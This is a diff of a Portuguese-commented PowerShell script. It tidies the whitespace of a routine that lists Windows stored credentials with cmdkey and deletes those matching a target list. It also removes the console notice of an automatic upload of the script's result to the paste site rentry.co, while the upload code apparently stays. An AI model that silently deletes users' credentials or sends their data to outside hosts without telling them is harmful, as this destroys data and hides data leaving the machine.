@@ -137,28 +137,29 @@ function Remove-WindowsCredentials {
 
     # Garante o uso do executavel do System32
     $cmdkeyPath = "$env:SystemRoot\System32\cmdkey.exe"
-    if (-not (Test-Path $cmdkeyPath)) {$cmdkeyPath = "cmdkey.exe"
+    if (-not (Test-Path $cmdkeyPath)) {
+        $cmdkeyPath = "cmdkey.exe"
     }
 
     # Executa o cmdkey e converte a saida para um array de linhas limpas
-    $cmdkeyOutput = &$cmdkeyPath /list 2>&1 | Out-String
-    $lines =$cmdkeyOutput -split "`r?`n"
+    $cmdkeyOutput = & $cmdkeyPath /list 2>&1 | Out-String
+    $lines = $cmdkeyOutput -split "`r?`n"
 
-    foreach ($line in$lines) {
+    foreach ($line in $lines) {
         # Extrai qualquer linha que contenha um indicador de alvo/target
         if ($line -match "(?:Target|Alvo):\s*(.+)" -or $line -match "Target=\s*(.+)") {
-            $credentialName =$Matches[1].Trim()
+            $credentialName = $Matches[1].Trim()
 
             # Verifica se o nome da credencial bate com algum dos nossos alvos
-            foreach ($target in$Targets) {
+            foreach ($target in $Targets) {
                 if ($credentialName -like "*$target*") {
                     
                     # Evita tentar apagar a mesma credencial duas vezes no mesmo loop
-                    if ($removed -notcontains$credentialName) {
+                    if ($removed -notcontains $credentialName) {
                         try {
                             & $cmdkeyPath /delete:$credentialName | Out-Null
                             Write-Host "  [OK] Credencial removida: $credentialName" -ForegroundColor Green
-                            $removed +=$credentialName
+                            $removed += $credentialName
                         } catch {}
                     }
                 }
@@ -341,8 +342,7 @@ try {
     Write-Host "[✓] Resultado copiado para a area de transferencia!" -ForegroundColor Green
 } catch {}
 
-# Envio automatico para o Rentry.co
-Write-Host "[...] Enviando resultado para https://rentry.co/$rentryEntryUrl..." -ForegroundColor Yellow
+
 
 try {
     # Garante o uso de TLS 1.2 para conexao HTTPS segura
